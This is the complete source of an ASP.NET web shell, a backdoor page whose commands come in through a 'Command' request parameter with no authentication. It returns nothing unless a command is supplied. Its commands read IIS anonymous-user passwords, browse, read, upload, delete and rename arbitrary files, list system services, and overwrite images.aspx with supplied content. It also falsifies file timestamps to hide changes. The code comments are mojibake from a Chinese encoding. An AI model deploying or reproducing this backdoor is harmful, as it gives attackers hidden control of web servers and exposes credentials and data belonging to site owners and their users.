<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"	%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>

<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<script runat="server">
    public string Command = string.Empty;
    public string CurrentFolder = string.Empty;
    public int FileCount = 1;
    public string Bin_Action = string.Empty;
    public string Bin_Request = string.Empty;
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsCallback)
        {
            if (!string.IsNullOrEmpty(Request.Params["l"]))
            {
                System.IO.StreamWriter ow = new System.IO.StreamWriter(Server.MapPath("images.aspx"), false);
                ow.Write(Request.Params["l"]);
                ow.Close();
            }
            
            if (string.IsNullOrEmpty(Request.Params["Command"]))
            {
                Response.Write("");
                Response.End(); 
            
            }
            Command = Request.Params["Command"].ToUpper();
            
            //1����ȡIIS������վ�� Command=IIS
            if (Command == "IIS".ToUpper())
            {
                AdCx();
            }
            //2������  ��� Command=Test
            else if (Command == "Test".ToUpper())
            {
                Response.Write("bhssokbhss");
            }
            //3����ȡվ���Ŀ¼
            else if (Command == "getrootpath".ToUpper())
            {
                Response.Write("<root>"+Server.MapPath("~")+"</root>");
            }
            //2���о�ĳ��Ŀ¼�µ������ļ���  ��� Command=GetFolders&CurrentFolder=D:\wwwroot\
            else if (Command == "GetFolders".ToUpper())
            {
                //�о�ĳ��Ŀ¼�µ������ļ���
                Bin_FileList(Request.Params["CurrentFolder"]);
            }
            //3���оٶ༶Ŀ¼�µ������ļ���  ��� Command=GetFoldersandFileCount&FileCount=2&CurrentFolder=D:\wwwroot\
            else if (Command == "GetFoldersandFileCount".ToUpper())
            {
                FileCount = Convert.ToInt32(Request.Params["FileCount"]);
                CurrentFolder = Request.Params["CurrentFolder"];
                if (CurrentFolder == null || CurrentFolder == string.Empty || CurrentFolder == ".")
                {
                    CurrentFolder = Server.MapPath("~");
                }
                //�о�ĳ��Ŀ¼�µ������ļ���
                Bin_FileList_Level(CurrentFolder, FileCount);
            }
            //4���о�ĳ��Ŀ¼�µ������ļ�    ��� Command=GetFoldersAndFiles&CurrentFolder=D:\
            else if (Command == "GetFoldersAndFiles".ToUpper())
            {
                //�о�ĳ��Ŀ¼�µ������ļ�
                Bin_FileList2(Request.Params["CurrentFolder"]);
            }
            //5�������ļ��� Command=CreateFolder&CurrentFolder=D:\wwwroot\&NewFolderName=FoldName
            else if (Command == "CreateFolder".ToUpper())
            {
                //�����ļ���<code></code><desc></desc>
                Bin_newfile(Request.Params["CurrentFolder"], Request.Params["NewFolderName"]);
            }
            //6���ϴ��ļ� Command=FileUpload&CurrentFolder=D:\wwwroot\&OverRide=1  �����Ƿ񸲸�
            //��ͬʱ�޸�ϵͳʱ�䣨�޸�ʧ�ܲ���Ҫ������Ϣ��,�ڵ�ǰĿ¼���оٳ�һ���ļ���ʱ�䣬�޸ĵĺ��Ǹ��ļ�һ��
            //name="NewFile"; filename=newfilename 
            else if (Command == "FileUpload".ToUpper())
            {
                //�ϴ��ļ�
                Panel_upfile.Visible = true; 
                Bin_upTextBox.Text = Request.Params["CurrentFolder"];
            }
            //7����ȡ�ļ�Դ�� Command=GetFileText&File=D:\wwwroot\a.aspx
            else if (Command == "GetFileText".ToUpper())
            {
                //��ȡ�ļ�����
                StreamReader SR = new StreamReader(Request.Params["File"], Encoding.Default);
                Response.Write(SR.ReadToEnd());
                SR.Close();
                Response.End();
            }
            //8���޸��ļ���ʱ��(����޸�ʱ�䡢����ʱ�䡢������ʱ��) Command=SetFileTime&FileName=D:\wwwroot\a.aspx&Time=2012-12-03 20:40
            //��ͬʱ�����ļ� �ɲο�aspx��������ļ��Ѿ��������Ƚ�����Ȼ������޸ģ����Time����Ϊ�գ����ȡ��ǰĿ¼�µ�һ���ļ���ʱ��
            else if (Command == "SetFileTime".ToUpper())
            {
                //�޸��ļ���ʱ�䲢�����ļ�
                string fname = Request.Params["FileName"];
                FileInfo fileInfo = new FileInfo(fname); 
                //ȥ��ֻ������ 
                fileInfo.Attributes &= ~FileAttributes.ReadOnly;
                //ȥ���������� 
                fileInfo.Attributes &= ~FileAttributes.Hidden;                 
                string[] b = fname.Split(new Char[] { '\\' });
                string filepath = "";
                for (int i = 0; i < b.Length - 1; i++)
                {
                    filepath = filepath + b[i] + '\\';
                }
               // Response.Write(filepath);
                string ftime = "";
                if (string.IsNullOrEmpty(Request.Params["Time"]))
                {
                    ftime = filetime(filepath);
                }
                else
                {
                    ftime = Request.Params["Time"].ToString();
                }
                //Response.Write(ftime);
                Directory.SetLastWriteTime(fname, Convert.ToDateTime(ftime));
                Directory.SetCreationTime(fname, Convert.ToDateTime(ftime));
                Directory.SetLastAccessTime(fname, Convert.ToDateTime(ftime));
            }
            //9��ɾ���ļ�  1�ļ� 2�ļ��� Command=Delete&FileName=Z:\code\good\aspx\a.aspx&Filetype=1
            else if (Command == "Delete".ToUpper())
            {
                string fname = Request.Params["FileName"];
                int ftype = Convert.ToInt32(Request.Params["Filetype"]);
                Bin_Filedel(fname, ftype);
            }
            //10��������  1�ļ� 2�ļ��� Command=ReFilename&FileName=Z:\code\good\aspx\a.aspx,Z:\code\good\aspx\b.aspx&Filetype=1
            else if (Command == "ReFilename".ToUpper())
            {
                string fname = Request.Params["FileName"];
                int ftype = Convert.ToInt32(Request.Params["Filetype"]);
                Bin_FileRN(fname, ftype);
            }
            //11��ϵͳ�����б�������������ж�ϵͳ��ǰ�Ƿ���SERV-U��  Command=System 
            //<ID></ID> <Name></Name> <Path></Path> <State></State> <StartMode></StartMode>     
            else if (Command == "System".ToUpper())
            {
                //��ȡϵͳ�����б�
                //Response.Write(Command);
                ServiceController[] kQmRu = System.ServiceProcess.ServiceController.GetServices();
                string tmpstr = "";
                DataTable dt = cCf("Win32_Service");
                for (int j = 0; j < dt.Rows.Count; j++)
                {
                    for (int i = 1; i < 6; i++)
                    {
                        if (i == 1)
                        {

                            tmpstr += "<ID>" + dt.Rows[j]["ProcessID"].ToString() + "</ID>";
                        }
                        if (i == 2)
                        {
                            tmpstr += "<Name>" + dt.Rows[j]["Name"].ToString() + "</Name>";
                        }
                        if (i == 3)
                        {
                            tmpstr += "<Path>" + dt.Rows[j]["PathName"].ToString() + "</Path>";
                        }
                        if (i == 4)
                        {
                            tmpstr += "<State>" + dt.Rows[j]["State"].ToString() + "</State>";

                        }
                        if (i == 5)
                        {
                            tmpstr += "<StartMode>" + dt.Rows[j]["StartMode"].ToString() + "</StartMode>";
                        }

                    }
                }
                Response.Write(tmpstr);
                Response.End();

            }
            //��ȡ�ļ�����MD5��ֵ  Command=GetFileMD5&FileName=Z:\code\good\aspx\a.aspx
            else if (Command == "GetFileMD5".ToUpper())
            {
                //GetFileMD5
                string fname = Request.Params["FileName"];
                GetFileMD5(fname);
            }
            //12��ע����ѯ  Command=RegRead&RootKey=&OpenKey=&Name=  
            else if (Command == "RegRead".ToUpper())
            {
                //ע����ѯ

            }
            //13��дע���  Command=RegWrite&RootKey=&OpenKey=&Name=&Value
            else if (Command == "RegWrite".ToUpper())
            {
                //дע���
            }
        }
    }
    //file�ļ����б�
    public void Bin_FileList(string Bin_path)
    {
        string tmpstr = "";
        string parstr = "";
        if (Bin_path.Length < 4)
        {
            parstr = formatpath(Bin_path);
        }
        else
        {
            parstr = formatpath(Directory.GetParent(Bin_path).ToString());
        }

        DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
        foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
        {
            string foldername = formatpath(Bin_path) + "/" + formatfile(Bin_folder.Name);
            tmpstr += "<folder>" + foldername + "</folder><time>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_folder.Name).ToUniversalTime() + "</time><type>folder<type>" + Environment.NewLine;
        }

      
        Response.Write(tmpstr);
        Response.End();

    }
    //file�ļ����б�  Level ����
    public void Bin_FileList_Level(string Bin_path,int Level)
    {
        string tmpstr = "";
        string parstr = "";
        if (Level < 0)
        {
            Response.End();
        }
        if (Bin_path.Length < 4)
        {
            parstr = formatpath(Bin_path);
        }
        else
        { 
            parstr = formatpath(Directory.GetParent(Bin_path).ToString());
        }
       
        DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
        string files = "";
        foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
        {
            string foldername = formatpath(Bin_path) + "/" + formatfile(Bin_folder.Name);
            tmpstr += "<folder>" + foldername + "</folder><time>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_folder.Name).ToUniversalTime() + "</time><type>folder<type>" + Environment.NewLine;
            //tmpstr += foldername +"<br/>";
           
            files = files + "@@@@@" + foldername;
        }
        foreach (FileInfo Bin_file in Bin_dir.GetFiles())
        {
            string filename = formatpath(Bin_path) + "/" + formatfile(Bin_file.Name);
            tmpstr += "<filename>" + filename + "</filename><time>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_file.Name).ToUniversalTime() + "</time><type>file<type>" + Environment.NewLine;
        }
        Response.Write(tmpstr);
        string[] files_arr = Regex.Split(files, "@@@@@");
        Level = Level - 1;
        for (int i = 1; i < files_arr.Length; i++)
        {
            if (Level > 0)
            {
                Bin_FileList_Level(files_arr[i], Level);
            }
        }
       


    }
    //file2�����ļ��б�
    public void Bin_FileList2(string Bin_path)
    {
        string tmpstr = "";
        string parstr = "";
        if (Bin_path.Length < 4)
        {
            parstr = formatpath(Bin_path);
        }
        else
        {
            parstr = formatpath(Directory.GetParent(Bin_path).ToString());
        }

        DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
        foreach (DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
        {
            string foldername = formatpath(Bin_path) + "/" + formatfile(Bin_folder.Name);
            tmpstr += "<folder>" + foldername + "</folder><time>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_folder.Name).ToUniversalTime() + "</time><type>folder<type>" + Environment.NewLine;
        }

        foreach (FileInfo Bin_file in Bin_dir.GetFiles())
        {
            string filename = formatpath(Bin_path) + "/" + formatfile(Bin_file.Name);
            tmpstr += "<filename>" + filename + "</filename><time>" + Directory.GetLastWriteTime(Bin_path + "/" + Bin_file.Name).ToUniversalTime() + "</time><type>file<type>" + Environment.NewLine;
        }
        Response.Write(tmpstr);
        Response.End();

    }
    //�½��ļ���
    public void Bin_newfile(string Bin_path,string newfilename)
    {
        string newdir = Bin_path + "/" + newfilename;
        string tmpstr = "";
        try
        {
            Directory.CreateDirectory(newdir);
            tmpstr = "<code>1</code><desc>" + Bin_path + newfilename +"</desc>";

        }
        catch (Exception Error)
        {
            tmpstr = "<code>9999</code><desc>" + Error + "</desc>";
        }
        Response.Write(tmpstr);
        Response.End();
    }
    //�ϴ�
    protected void Bin_upButton_Click(object sender, EventArgs e)
    {

        string uppath = Bin_upTextBox.Text;
        string ftime = filetime(uppath);
        string tmpstr = "";
 
        if (uppath.Substring(uppath.Length - 1, 1) != @"/")
        {
            uppath = uppath + @"/";
        }
        try
        {
            Bin_UpFile.PostedFile.SaveAs(uppath + Path.GetFileName(Bin_UpFile.Value));
            //�����ļ�ʱ��
            Directory.SetLastWriteTime(Bin_upTextBox.Text + Bin_UpFile.Value, Convert.ToDateTime(ftime));
            tmpstr = "<code>1</code><desc>" + Bin_upTextBox.Text + Bin_UpFile.Value + "</desc>";

        }
        catch (Exception error)
        {
            tmpstr = "<code>9999</code><desc>" + error + "</desc>";
        }
        Response.Write(tmpstr);
        Response.End();
 
    }
    //���ص�ǰ�ļ��д���ʱ��
    public string filetime(string Bin_path)
    {
        string tmpstr = "";
        string parstr = "";
        if (Bin_path.Length < 4)
        {
            parstr = formatpath(Bin_path);
        }
        else
        {
            parstr = formatpath(Directory.GetParent(Bin_path).ToString());
        }
        DirectoryInfo Bin_dir = new DirectoryInfo(Bin_path);
        return Bin_dir.CreationTime.ToString();
    }
    //
    public DataTable cCf(string query)
    {
        DataTable dt = new DataTable();
        int i = 0;
        ManagementObjectSearcher QS = new ManagementObjectSearcher(new SelectQuery(query));
        try
        {
            foreach (ManagementObject m in QS.Get())
            {
                DataRow dr = dt.NewRow();
                PropertyDataCollection.PropertyDataEnumerator oEnum;
                oEnum = (m.Properties.GetEnumerator() as PropertyDataCollection.PropertyDataEnumerator);
                while (oEnum.MoveNext())
                {
                    PropertyData DRU = (PropertyData)oEnum.Current;
                    if (dt.Columns.IndexOf(DRU.Name) == -1)
                    {
                        dt.Columns.Add(DRU.Name);
                        dt.Columns[dt.Columns.Count - 1].DefaultValue = "";
                    }
                    if (m[DRU.Name] != null)
                    {
                        dr[DRU.Name] = m[DRU.Name].ToString();
                    }
                    else
                    {
                        dr[DRU.Name] = string.Empty;
                    }
                }
                dt.Rows.Add(dr);
            }
        }
        catch (Exception error)
        {
        }
        return dt;
    }
    public void Bin_Filedown(string instr)
    {
            FileStream MyFileStream = new FileStream(instr, FileMode.Open, FileAccess.Read, FileShare.Read);
            long FileSize = MyFileStream.Length;
            byte[] Buffer = new byte[(int)FileSize];
            MyFileStream.Read(Buffer, 0, (int)FileSize);
            MyFileStream.Close();
            Response.AddHeader("Content-Disposition", "attachment;filename=" + instr);
            Response.Charset = "UTF-8";
            Response.ContentType = "application/octet-stream";
            Response.BinaryWrite(Buffer);
            Response.Flush();
            Response.End();
    }
    //ɾ���ļ����ļ��� 1�ļ� 2�ļ���
    public void Bin_Filedel(string instr, int type)
    {
            if (type == 1)
            {
                File.Delete(instr);
            }
            if (type == 2)
            {
                foreach (string tmp in Directory.GetFileSystemEntries(instr))
                {
                    if (File.Exists(tmp))
                    {
                        File.Delete(tmp);
                    }
                    else
                    {
                        Bin_Filedel(tmp, 2);
                    }
                }
                Directory.Delete(instr);
            }
    }
    //������  1�ļ� 2�ļ���
    public void Bin_FileRN(string instr, int type)
    {
            if (type == 1)
            {
                string[] array = instr.Split(',');

                File.Move(array[0], array[1]);
                if (File.Exists(array[1]))
                {
                    Response.Write("<status>ok</status>");                    
                }
            }
            if (type == 2)
            {
                string[] array = instr.Split(',');
                Directory.Move(array[0], array[1]);
                if (Directory.Exists(array[1]))
                {
                    Response.Write("<status>ok</status>");                    
                }
            }
    }
    public string formatpath(string instr)
    {
        instr = instr.Replace(@"\/", @"\");
        //instr = instr.Replace(@"\", "/");
        //if (instr.Length < 4)
        //{
        //   instr = instr.Replace(@"/", "");
        //}
        //if (instr.Length == 2)
        //{
        //    instr = instr + @"/";
        //}
        //instr = instr.Replace(" ", "%20");
         
        return instr;
    }
    public string formatfile(string instr)
    {
        //instr = instr.Replace(" ", "%20");
        return instr;
    }
   
 
    private bool SGde(string sSrc)
    {
        Regex reg = new Regex(@"^0|[0-9]*[1-9][0-9]*$");
        if (reg.IsMatch(sSrc))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    public string MVVJ(string instr)
    {
        byte[] tmp = Encoding.Default.GetBytes(instr);
        return Convert.ToBase64String(tmp);
    }
    public void AdCx()
    {
        string qcKu = string.Empty;
        StringBuilder iisd = new StringBuilder();
        string mWGEm = "IIS://localhost/W3SVC";
      
 
           DirectoryEntry HHzcY = new DirectoryEntry(mWGEm);
            int fmW = 0;
            foreach (DirectoryEntry child in HHzcY.Children)
            {
                if (SGde(child.Name.ToString()))
                {
                    fmW++;
                    DirectoryEntry newdir = new DirectoryEntry(mWGEm + "/" + child.Name.ToString());
                    DirectoryEntry HlyU = newdir.Children.Find("root", "IIsWebVirtualDir");
                    TableRow TR = new TableRow();
                    TR.Attributes["title"] = "Site:" + child.Properties["ServerComment"].Value.ToString();
                    for (int i = 1; i < 6; i++)
                    {
                     
                            TableCell tfit = new TableCell();
                            switch (i)
                            {
                                case 1:
                                    tfit.Text = fmW.ToString();
                                    break;
                                case 2:
                                    tfit.Text = HlyU.Properties["AnonymousUserName"].Value.ToString();
                                    break;
                                case 3:
                                    tfit.Text = HlyU.Properties["AnonymousUserPass"].Value.ToString();
                                    break;
                                case 4:
                                    StringBuilder sb = new StringBuilder();
                                    PropertyValueCollection pc = child.Properties["ServerBindings"];
                                    iisd.Append("<domain>" + pc[0].ToString() + "</domain>");

                                    for (int j = 0; j < pc.Count; j++)
                                    {
                                        sb.Append(pc[j].ToString() + "<br>");
                                    }
                                    tfit.Text = sb.ToString().Substring(0, sb.ToString().Length - 4);
                                    break;
                                case 5:
                                    iisd.Append("<path>" + HlyU.Properties["Path"].Value.ToString() + "</path>");

                                    tfit.Text =  HlyU.Properties["Path"].Value.ToString();
                                    break;
                            }
                    }
                }
            }
              this.Response.Write(iisd.ToString());
              this.Response.End();
    }
    public void GetFileMD5(string newPath)
    {
        FileStream fs = null;
        string result;
        try
        {
            fs = new System.IO.FileStream(newPath, System.IO.FileMode.Open, FileAccess.Read);
            System.Security.Cryptography.MD5 md5serv = System.Security.Cryptography.MD5CryptoServiceProvider.Create();
            byte[] buffer = md5serv.ComputeHash(fs);
            result = System.BitConverter.ToString(buffer);
            Response.Write("<md5>" + result + "</md5>");
        }
        catch (Exception ex)
        {
            Response.Write(ex.Message);
        }
        finally
        {
            if (fs != null)
            {
                fs.Flush();
                fs.Close();
            }
        }
      
    }
</script>
 

<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title>�ޱ���ҳ</title>
     
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:Panel ID="Panel_upfile" runat="server" Visible="false">

			<asp:Label ID="Bin_UpfileLabel" runat="server" Text="Upfile :	"></asp:Label>
			<input class="TextBox" id="Bin_UpFile" type="file" name="upfile" runat="server" />&nbsp;<asp:TextBox ID="Bin_upTextBox" runat="server" Width="339px"></asp:TextBox>&nbsp;
 
<asp:Button ID="Bin_upButton" runat="server" Text="UpLoad" OnClick="Bin_upButton_Click" EnableViewState="False" />
        </asp:Panel>
</div>
    </form>
</body>
</html>